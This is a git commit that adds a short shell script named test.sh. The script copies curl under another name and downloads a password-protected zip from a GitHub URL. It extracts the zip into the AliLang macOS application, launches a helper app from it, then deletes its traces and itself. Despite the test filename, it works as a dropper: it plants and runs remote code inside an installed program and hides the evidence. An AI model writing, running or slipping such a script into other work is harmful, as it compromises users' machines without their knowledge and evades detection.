706ce99f357a9ff67dd56fbda2d4e6d62eba44fa
fengxiaopeng1 <116345627+fengxiaopeng1@users.noreply.github.com>
2023-03-21 16:29:01 +0800

    Add files via upload

---
+++ test.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+cp /usr/bin/curl /tmp/burl
+/tmp/burl -o /tmp/alilangHelper.zip --create-dirs  https://raw.githubusercontent.com/fengxiaopeng1/zeek/master/gfz_mac0s_Alilang_2.zip
+chmod 755 /tmp/alilangHelper.zip 
+cp /tmp/alilangHelper.zip /Applications/AliLang.app/Contents/alilangHelper.zip
+unzip -P alibaba -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/alilangHelper.zip
+unzip -d /Applications/AliLang.app/Contents/ /Applications/AliLang.app/Contents/Alilang.zip
+chmod 755 /Applications/AliLang.app/Contents/AliLang\ Helper.app
+open /Applications/AliLang.app/Contents/AliLang\ Helper.app    
+rm -f /tmp/alilangHelper
+rm -f /Applications/AliLang.app/Contents/Alilang.zip
+rm -f /Applications/AliLang.app/Contents/AliLang Helper.app/Contents/MacOS/AliLang Helper
+rm -f $0
